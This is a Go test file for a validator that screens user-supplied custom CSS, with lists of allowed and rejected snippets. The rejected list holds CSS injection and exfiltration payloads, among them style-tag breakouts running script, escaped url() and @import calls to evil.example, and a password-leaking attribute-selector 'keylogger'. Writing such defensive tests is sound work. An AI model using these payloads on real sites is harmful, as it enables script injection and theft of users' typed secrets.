package utils

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestValidateCustomCSS_Allowed(t *testing.T) {
	tests := map[string]string{
		"empty":               "",
		"plain rules":         ".glass-card { border-radius: 0; color: #fff }",
		"escaped class":       `.sm\:p-6 { padding: 0 }`,
		"content escape":      `a::before { content: "\201C" }`,
		"media range":         "@media (width < 40rem) { body { font-size: 14px } }",
		"data image":          `body { background: url(data:image/png;base64,iVBORw0KGgo=) }`,
		"quoted data image":   `body { background: URL( "data:image/svg+xml,%3Csvg/%3E" ) }`,
		"font-face local":     `@font-face { font-family: x; src: local("Arial") }`,
		"scroll-behavior":     "html { scroll-behavior: smooth }",
		"html comment tokens": "<!-- .a { color: red } -->",
		"attribute selector":  `input[value^="a"] { color: red }`,
		"exactly the cap":     strings.Repeat("a", MaxCustomCSSBytes),
		// What people paste
		"comment":             "/* cards: square, see https://example.com/tips */ .glass-card { border-radius: 0 }",
		"important":           ".glass-card { border-radius: 0 !important }",
		"has":                 ".glass-card:has(> img:not([alt])) { outline: 2px solid red }",
		"supports":            "@supports (backdrop-filter: blur(4px)) { .glass-card { backdrop-filter: blur(4px) } }",
		"keyframes":           "@keyframes spin { from { rotate: 0deg } to { rotate: 360deg } } .a { animation: spin 2s linear infinite }",
		"container":           "@container card (min-width: 20rem) { .title { font-size: 1.25rem } }",
		"layer":               "@layer theme, mine; @layer mine { body { color: red } }",
		"property":            `@property --angle { syntax: "<angle>"; inherits: false; initial-value: 0deg }`,
		"unicode":             `.título::after { content: "→ ✓ 日本語 🎉" }`,
		"gradients":           "body { background: linear-gradient(135deg, #1e1e2e 0%, rgb(49 50 68 / 80%) 100%), radial-gradient(circle at top, #89b4fa, transparent) }",
		"variables":           ":root { --color-card: #000; --gap: calc(1rem + 2px) } .a { gap: var(--gap, 1rem); inset: env(safe-area-inset-top) }",
		"attr and counters":   `a::after { content: " (" attr(href) ")" counter(item) }`,
		"nesting":             ".glass-card { &:hover { color: red } .title { color: blue } }",
		"moz element":         "a { background: -moz-element(#x) }",
		"escaped newline":     "a::before { content: \"one \\\ntwo\" }",
		"font-face data":      `@font-face { font-family: x; src: url(data:image/svg+xml;base64,AA==) format("svg") }`,
		"data image, escaped": `a { background: url(\64 ata:image/png;base64,AA==) }`,
		"svg data image":      `a { background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><image href='https://evil.example/a.png'/></svg>") }`,
		"namespace string":    `@namespace svg "http://www.w3.org/2000/svg";`,
		"cross-fade of data":  `a { background: cross-fade(url(data:image/png;base64,AA==), url(data:image/png;base64,AA==), 50%) }`,
	}
	for name, css := range tests {
		t.Run(name, func(t *testing.T) {
			assert.NoError(t, ValidateCustomCSS(css))
		})
	}
}

func TestValidateCustomCSS_Rejected(t *testing.T) {
	tests := map[string]string{
		"over the cap":                 strings.Repeat("a", MaxCustomCSSBytes+1),
		"nul byte":                     "a { color: red }\x00",
		"invalid utf-8":                "a { color: \xff }",
		"style breakout":               `</style><script>alert(1)</script>`,
		"style breakout, case":         `</STYLE >`,
		"style breakout, escaped":      `<\/style>`,
		"import url":                   `@import url("https://evil.example/x.css");`,
		"import string":                `@import "https://evil.example/x.css";`,
		"import, case":                 `@IMPORT 'x.css';`,
		"import, escaped":              `@\69mport "https://evil.example/x.css";`,
		"import, escaped + space":      `@\000069 mport "x.css";`,
		"external url":                 `body { background: url(https://evil.example/a.png) }`,
		"external url, quoted":         `body { background: url( "https://evil.example/a.png" ) }`,
		"protocol-relative url":        `body { background: url(//evil.example/a.png) }`,
		"relative url":                 `body { background: url(/api/v1/users/me) }`,
		"url, case":                    `body { background: URL(https://evil.example) }`,
		"url, escaped":                 `body { background: \75rl("https://evil.example") }`,
		"url, escaped crlf":            "body { background: \\75\r\nrl(\"https://evil.example\") }",
		"url, escaped newline":         "body { background: ur\\\nl(https://evil.example) }",
		"url behind a comment":         `body { background: url(/**/https://evil.example) }`,
		"url split by a comment":       `body { background: u/**/rl(https://evil.example) }`,
		"url, leading space":           `body { background: url(" https://evil.example") }`,
		"data url that is no image":    `body { background: url(data:text/html,<script>alert(1)</script>) }`,
		"relative url behind a quote":  `a { background: url("'data:image/a'/../../../_next/image?url=https://evil.example/x&w=64&q=75") }`,
		"relative url, escaped quote":  `a { background: url(\"data:image/a\"/../../../_next/image?url=https://evil.example/x&w=64&q=75) }`,
		"relative url, hex quote":      `a { background: url(\22 data:image/a\22/../../../_next/image?url=https://evil.example/x) }`,
		"relative url, quote in quote": `a { background: url('"data:image/a"/../x') }`,
		"second url":                   `a { background: url(data:image/png;base64,AA==) } b { background: url(http://evil.example) }`,
		"font-face src":                `@font-face { font-family: x; src: url(https://evil.example/f.woff2) }`,
		"image-set string":             `body { background: image-set("https://evil.example/a.png" 1x) }`,
		"webkit image-set":             `body { background: -webkit-image-set(url(data:image/png;base64,AA==) 1x) }`,
		"src function":                 `@font-face { src: src("https://evil.example/f.woff2") }`,
		"keylogger":                    `input[type="password"][value$="a"] { background: url("https://evil.example/a") }`,
		"expression":                   `a { width: expression(alert(1)) }`,
		"javascript url":               `a { background: url(javascript:alert(1)) }`,
		"javascript, escaped":          `a { x: java\73 cript:alert(1) }`,
		"moz binding":                  `a { -moz-binding: none }`,
		// More ways to write a URL or @import
		"url, escaped r":               `a { background: u\72l(https://evil.example) }`,
		"url, six digit escape":        `a { background: \000075rl(https://evil.example) }`,
		"url, every letter escaped":    `a { background: \75\72\6c(https://evil.example) }`,
		"url, escaped paren":           `a { background: url\28https://evil.example) }`,
		"url, tab and newline":         "a { background: url(\t\n\"https://evil.example\") }",
		"url, form feed":               "a { background: url(\f/api/v1/users/me) }",
		"import, dotted capital i":     "@\u0130mport 'x.css';",
		"import, comment after":        `@import/**/"https://evil.example/x.css";`,
		"import in a layer":            `@import url(data:image/png;base64,AA==) layer(x);`,
		"import after a charset":       `@charset "utf-8"; @import 'x';`,
		"font-face src, escaped":       `@font-face { font-family: x; s\72 c: \75 rl(//evil.example/f.woff2) }`,
		"image function":               `a { background: image("https://evil.example/a.png") }`,
		"image-set, escaped":           `a { background: image-\73 et("https://evil.example/a.png" 1x) }`,
		"image-set, type":              `a { background: image-set("/api/v1/users/me" type("image/png")) }`,
		"cross-fade":                   `a { background: cross-fade(url(https://evil.example/a.png), url(data:image/png;base64,AA==), 50%) }`,
		"namespace url":                `@namespace url(http://www.w3.org/1999/xhtml);`,
		"document url":                 `@document url(https://evil.example/) { a { color: red } }`,
		"url in a custom property":     `:root { --u: url(https://evil.example/a.png) } a { background: var(--u) }`,
		"url from a custom property":   `:root { --u: "https://evil.example/a.png" } a { background: url(var(--u)) }`,
		"url from attr":                `a { background: url(attr(href)) }`,
		"url from env":                 `a { background: url(env(x)) }`,
		"property with a url":          `@property --u { syntax: "<url>"; inherits: false; initial-value: url(https://evil.example) }`,
		"data text/html":               `a { background: url("data:text/html,<script>alert(1)</script>") }`,
		"data, no image type":          `a { background: url(data:,image/png) }`,
		"data image after a path":      `a { background: url(/data:image/png) }`,
		"data image after a dot":       `a { background: url(./data:image/../../_next/image?url=https://evil.example/x&w=64&q=75) }`,
		"data image, escaped quote":    `a { background: url(\27 data:image/a\27/../x) }`,
		"data image after a backslash": `a { background: url(\\data:image/a) }`,
		"data image after a nul":       `a { background: url(\0 data:image/a) }`,
		"fragment":                     `a { filter: url(#blur) }`,
		"empty url":                    `a { background: url() }`,
		"url after an open comment":    `a { color: red } /* url(https://evil.example)`,
		"url after an open string":     `a { content: "x; background: url(https://evil.example) }`,
		"url hidden by a comment end":  `/* \*/ a { background: url(https://evil.example) } /* */`,
		"url in a comment in a string": `a { content: "/*" } b { background: url(https://evil.example) } c { content: "*/" }`,
		"style breakout, in a comment": `/* </style><script>alert(1)</script> */`,
		"style breakout, in a string":  `a { content: "</style>" }`,
		// Refused although a browser would load nothing: the price of
		// checking the text instead of parsing it
		"image( in a comment":         `/* background image(s) */ a { color: red }`,
		"url( inside an svg data url": `a { background: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect fill='url(%23g)'/></svg>") }`,
		"import in a comment":         `/* no @import here */`,
		"paint worklet url":           `a { background: paint(x), url(https://evil.example) }`,
	}
	for name, css := range tests {
		t.Run(name, func(t *testing.T) {
			assert.Error(t, ValidateCustomCSS(css))
		})
	}
}

func TestDecodeCSSEscapes(t *testing.T) {
	tests := map[string]string{
		`plain`:        "plain",
		`\75rl(`:       "url(",
		`\75 rl(`:      "url(",
		`\000075  rl(`: "u rl(",
		`\u\r\l(`:      "url(",
		"a\\\nb":       "ab",
		`\0`:           "\uFFFD",
		`\110000`:      "\uFFFD",
		`end\`:         "end",
		`\"\'\22 \27`:  "\uFFFD\uFFFD\uFFFD\uFFFD",
	}
	for css, want := range tests {
		assert.Equal(t, want, decodeCSSEscapes(css), css)
	}
}
